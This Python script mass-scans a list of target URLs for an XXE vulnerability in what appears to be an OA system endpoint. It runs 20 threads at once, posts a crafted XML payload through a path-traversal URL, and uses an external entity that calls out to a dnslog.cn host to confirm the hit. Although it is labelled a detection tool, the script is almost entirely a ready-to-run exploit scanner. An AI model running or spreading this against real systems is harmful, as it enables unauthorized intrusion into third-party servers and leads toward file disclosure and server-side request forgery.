import requests
import threading
from urllib.parse import urljoin
import time

# 配置信息 - 请修改这里的DNSLOG地址
DNSLOG_URL = "http://o4ui8c.dnslog.cn"  # 请修改为您自己的DNSLOG地址
THREADS = 20  # 并发线程数
TIMEOUT = 10  # 请求超时时间

# XXE payload模板
XXE_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "{dnslog_url}" >]>
<value>&xxe;</value>'''

def check_xxe_vulnerability(target_url):
    """
    检测目标URL是否存在XXE漏洞
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/xml'
    }
    
    # 构造完整的请求URL
    full_url = urljoin(target_url, '/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService')
    
    # 构造payload
    payload = XXE_PAYLOAD.format(dnslog_url=DNSLOG_URL)
    
    try:
        print(f"[*] 正在检测: {target_url}")
        response = requests.post(
            full_url, 
            data=payload, 
            headers=headers, 
            timeout=TIMEOUT,
            verify=False  # 忽略SSL证书验证
        )
        
        print(f"[+] {target_url} - 响应状态码: {response.status_code}")
        print(f"    响应长度: {len(response.text)}")
        
        # 记录检测结果
        with open('result.txt', 'a', encoding='utf-8') as f:
            f.write(f"URL: {target_url}\n")
            f.write(f"状态码: {response.status_code}\n")
            f.write(f"响应长度: {len(response.text)}\n")
            f.write("="*50 + "\n")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] {target_url} - 请求失败: {e}")

def main():
    print("=" * 60)
    print("XXE漏洞检测脚本")
    print(f"DNSLOG地址: {DNSLOG_URL}")
    print("=" * 60)
    
    try:
        # 读取URL列表
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("[-] url.txt文件中没有找到有效的URL")
            return
            
        print(f"[+] 共读取到 {len(urls)} 个URL")
        
        # 清空结果文件
        open('result.txt', 'w').close()
        
        # 使用线程池进行并发检测
        threads = []
        for url in urls:
            thread = threading.Thread(target=check_xxe_vulnerability, args=(url,))
            threads.append(thread)
            thread.start()
            
            # 控制并发数
            if len(threads) >= THREADS:
                for t in threads:
                    t.join()
                threads = []
                time.sleep(1)  # 避免请求过于频繁
        
        # 等待剩余线程完成
        for thread in threads:
            thread.join()
            
        print("\n" + "=" * 60)
        print("[+] 检测完成！")
        print("[!] 请在DNSLOG平台查看是否有请求记录")
        print("[!] 如果DNSLOG有显示请求，则说明漏洞利用成功")
        print("[!] 详细结果已保存到 result.txt 文件")
        print("=" * 60)
        
    except FileNotFoundError:
        print("[-] 找不到 url.txt 文件")
    except Exception as e:
        print(f"[-] 发生错误: {e}")

if __name__ == "__main__":
    # 忽略SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()